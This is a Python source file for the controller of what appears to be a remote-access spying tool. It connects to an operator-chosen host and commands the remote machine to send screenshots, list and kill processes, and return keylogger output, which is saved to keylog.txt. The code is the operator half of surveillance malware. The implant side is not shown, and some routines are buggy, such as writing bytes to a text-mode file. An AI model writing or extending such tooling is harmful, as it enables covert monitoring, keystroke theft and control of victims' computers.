import socket
import os
import time

# Commands
CMD_SHUTDOWN = 'shutdown'
CMD_TAKE_SCREENSHOT = 'screenshot'
CMD_KEY_LOGGER = 'keylogger'
CMD_VIEW_PROCESSES = 'view_processes'
CMD_KILL_PROCESS = 'kill_process'

# BUFFER
BUFFER_SIZE = 1024

# SCREENSHOT
SCREENSHOT_PATH = './tmp/'


class Client:
  def __init__(self):
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.host = ''
    self.port = 0
    self.addr = (self.host, self.port)

  def connect(self):
    self.host = input('Enter host: ')
    self.port = int(input('Enter port: '))
    self.addr = (self.host, self.port)
    is_disconnected = True
    print("[CONNECTING] Connecting to server...")
    while is_disconnected:
      try:
        self.socket.connect(self.addr)
        # self.client.settimeout(None)
        is_disconnected = False
        print("[SUCCESS] Connected to server")
      except TimeoutError:
          print("[ERROR] Connection timeout")
          exit()
      except ConnectionRefusedError:
          pass
      except ConnectionAbortedError:
          pass

  def run(self):
    while True:
      cmd = input('''Enter command: 
      1: Take screenshot
      2: View processes
      3: Kill process
      4: Shutdown
      ''')
      if cmd == '1':
        self.take_screenshot()
        self.receive_image()
      elif cmd == '2':
        self.view_processes()
      elif cmd == '3':
        pid = input('Enter PID: ')
        self.kill_process(pid)
      elif cmd == '4':
        self.shutdown()
        break

  def shutdown(self):
    self.socket.send(CMD_SHUTDOWN.encode())
    print("[SHUTDOWN] Disconnected from server")

  def take_screenshot(self):
    self.socket.send(CMD_TAKE_SCREENSHOT.encode())

  def receive_image(self):
    with open(os.path.join(SCREENSHOT_PATH, 'screenshot.png'), 'wb') as f:
      while True:
        data = self.socket.recv(BUFFER_SIZE)
        if not data:
          break
        f.write(data)

  def key_logger(self):
    with open(os.path.join(SCREENSHOT_PATH, 'keylog.txt'), 'w') as f:
      while True:
        data = self.socket.recv(BUFFER_SIZE)
        if not data:
          break
        f.write(data)

  def view_processes(self):
    self.socket.send(CMD_VIEW_PROCESSES.encode())
    processes = ""
    while True:
      data = self.socket.recv(BUFFER_SIZE)
      if data == b'PROCESSES_END':
        break
      else:
        processes = data.decode()
        
    print(processes)
      
  def kill_process(self, pid):
    self.socket.send(CMD_KILL_PROCESS.encode())
    time.sleep(0.01)
    self.socket.send(str(pid).encode())
    


